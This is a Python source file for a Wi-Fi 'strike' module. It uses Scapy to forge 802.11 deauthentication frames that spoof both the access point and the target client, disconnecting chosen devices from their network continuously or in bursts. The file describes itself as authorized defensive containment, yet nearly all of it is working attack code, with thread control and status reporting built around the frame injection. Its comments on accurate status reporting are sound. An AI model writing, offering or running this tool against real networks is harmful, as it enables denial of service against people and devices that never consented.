"""LOCKON EWAC — STRIKE Module (Wireless Containment / Deauth)

Provides authorized Deauthentication capabilities for defensive cybersecurity
operations. Uses Scapy to craft IEEE 802.11 Deauth frames.

Requirements:
  - Scapy >= 2.5
  - Npcap (with raw 802.11 traffic support enabled)
  - Monitor-mode capable Wi-Fi adapter (e.g., Alfa AWUS036ACH)

Usage:
  This module is controlled via IPC commands from the frontend.
  Only authorized operators should have access to STRIKE capabilities.
"""

import threading
import time


class StrikeModule:
    """Handles Deauthentication frame injection for wireless containment."""

    def __init__(self, ipc):
        self.ipc = ipc
        self.active_strikes = {}   # target_mac -> { thread, running, count }
        self._scapy_loaded = False
        self._load_error = None

    def _ensure_scapy(self):
        """Lazy-load Scapy to avoid import cost at startup."""
        if self._scapy_loaded:
            return True
        try:
            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf
            self._scapy_loaded = True
            return True
        except ImportError as e:
            self._load_error = f"Scapy not available: {e}"
            return False
        except Exception as e:
            self._load_error = f"Scapy initialization error: {e}"
            return False

    def get_monitor_interfaces(self):
        """Attempt to list interfaces that may support monitor mode."""
        try:
            from scapy.all import get_if_list
            return get_if_list()
        except Exception:
            return []

    def start_strike(self, target_mac, gateway_bssid, iface=None, count=100, reason=7, interval=0.05):
        """Start sending Deauth frames to disconnect a target device.
        
        Args:
            target_mac: MAC address of the target device to disconnect
            gateway_bssid: BSSID of the access point the target is connected to
            iface: Network interface to use (must be in monitor mode)
            count: Number of deauth frames per burst (0 = continuous until stopped)
            reason: 802.11 reason code (7 = Class 3 frame received from nonassociated STA)
            interval: Delay between packets in seconds
        """
        if not self._ensure_scapy():
            self.ipc.emit("strike_error", {
                "message": self._load_error or "Scapy is not available. Install with: pip install scapy",
                "target_mac": target_mac
            })
            return

        # Check if already striking this target
        if target_mac in self.active_strikes and self.active_strikes[target_mac].get("running"):
            self.ipc.emit("strike_error", {
                "message": f"Strike already active for {target_mac}",
                "target_mac": target_mac
            })
            return

        # Start deauth in a background thread
        # `ceased` records that the operator stopped it, so the worker's terminal
        # event can say so. See stop_strike.
        strike_state = {"running": True, "sent": 0, "count": count, "ceased": False}
        self.active_strikes[target_mac] = strike_state

        def _deauth_worker():
            try:
                from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf

                if iface:
                    conf.iface = iface

                # Frame 1: AP → Client (pretend AP is kicking client off)
                frame_ap = (
                    RadioTap() /
                    Dot11(type=0, subtype=12,
                          addr1=target_mac,          # Destination: target
                          addr2=gateway_bssid,        # Source: AP
                          addr3=gateway_bssid) /      # BSSID: AP
                    Dot11Deauth(reason=reason)
                )

                # Frame 2: Client → AP (pretend client is leaving)
                frame_client = (
                    RadioTap() /
                    Dot11(type=0, subtype=12,
                          addr1=gateway_bssid,        # Destination: AP
                          addr2=target_mac,            # Source: target
                          addr3=gateway_bssid) /      # BSSID: AP
                    Dot11Deauth(reason=reason)
                )

                self.ipc.emit("strike_started", {
                    "target_mac": target_mac,
                    "gateway_bssid": gateway_bssid,
                    "status": "ACTIVE",
                    "count": count
                })

                sent = 0
                send_failed = None
                while strike_state["running"]:
                    if count > 0 and sent >= count:
                        break

                    try:
                        sendp(frame_ap, verbose=False, iface=iface)
                        sendp(frame_client, verbose=False, iface=iface)
                        sent += 2
                        strike_state["sent"] = sent
                    except Exception as e:
                        send_failed = str(e)
                        self.ipc.emit("strike_error", {
                            "message": f"Packet send failed: {e}",
                            "target_mac": target_mac
                        })
                        break

                    # Emit progress periodically
                    if sent % 20 == 0:
                        self.ipc.emit("strike_progress", {
                            "target_mac": target_mac,
                            "packets_sent": sent,
                            "status": "ACTIVE"
                        })

                    time.sleep(interval)

                # A strike that could not put a frame on the air is not
                # "COMPLETED". It used to report exactly that, right after the
                # error, so the UI and anything reading the event stream saw a
                # finished operation where nothing had been transmitted.
                #
                # Nor is a strike the operator stopped. `stop_strike` used to emit
                # its own `strike_stopped {status: "CEASED"}` and then this ran and
                # emitted a *second* one — with `send_failed` still None, so the
                # status was COMPLETED. Two terminal events for one strike, the
                # later of which contradicted the earlier and claimed a partial
                # `packets_sent` as a finished run. The count a report prints is
                # the number of frames handed to the interface, and "we stopped
                # after 40" and "the run of 200 completed" are different facts.
                #
                # There is one terminal event now, emitted here, and it knows which
                # of the three ways the loop ended.
                strike_state["running"] = False
                if send_failed:
                    status = "FAILED"
                elif strike_state.get("ceased"):
                    status = "CEASED"
                else:
                    status = "COMPLETED"
                self.ipc.emit("strike_stopped", {
                    "target_mac": target_mac,
                    "packets_sent": sent,
                    "status": status,
                    "error": send_failed,
                    # Even a clean send is not proof of delivery: without monitor
                    # mode or elevation the adapter can accept the frame and
                    # never transmit it. Only the target going offline is.
                    "caveat": (
                        "Frames were rejected by the interface; nothing was transmitted."
                        if send_failed else
                        (
                            f"Stopped by the operator after {sent} frame(s); the requested run "
                            f"of {count} did not finish. "
                            if status == "CEASED" and count > 0 else
                            f"Stopped by the operator after {sent} frame(s). "
                            if status == "CEASED" else
                            ""
                        )
                        + "Frames were handed to the interface. Without a monitor-mode adapter "
                        "and elevation they may still have been dropped before transmission — "
                        "confirm the disconnect from the target's own state, not from this count."
                    ),
                })

            except Exception as e:
                strike_state["running"] = False
                self.ipc.emit("strike_error", {
                    "message": f"Strike failed: {e}",
                    "target_mac": target_mac
                })
            finally:
                # Entries were never removed, so `active_strikes` accumulated every
                # strike of the session and `get_status` listed finished ones as
                # though they were live.
                self.active_strikes.pop(target_mac, None)

        t = threading.Thread(target=_deauth_worker, daemon=True, name=f"strike-{target_mac}")
        t.start()
        strike_state["thread"] = t

    def stop_strike(self, target_mac):
        """
        Request a stop. The worker emits the one terminal event.

        This used to emit `strike_stopped {status: "CEASED"}` itself, and then the
        worker loop exited and emitted a second `strike_stopped` — with no send
        error recorded, so `status: "COMPLETED"`. The last word on a strike the
        operator had halted was that it finished.

        It also returned True for a target whose strike had ended long ago, because
        entries were never removed from `active_strikes`: `stop_all` then re-emitted
        CEASED for finished strikes on every call.
        """
        state = self.active_strikes.get(target_mac)
        if not state:
            return False
        if not state.get("running"):
            # Already over. Saying so is better than reporting a stop that
            # stopped nothing.
            self.active_strikes.pop(target_mac, None)
            return False
        state["ceased"] = True
        state["running"] = False
        self.ipc.emit("strike_progress", {
            "target_mac": target_mac,
            "packets_sent": state.get("sent", 0),
            "status": "STOPPING",
        })
        return True

    def stop_all(self):
        """Emergency stop all active strikes."""
        for mac in list(self.active_strikes.keys()):
            self.stop_strike(mac)

    def get_status(self):
        """Return status of all active strikes."""
        status = {}
        for mac, state in self.active_strikes.items():
            status[mac] = {
                "running": state.get("running", False),
                "packets_sent": state.get("sent", 0),
                "count": state.get("count", 0)
            }
        return status
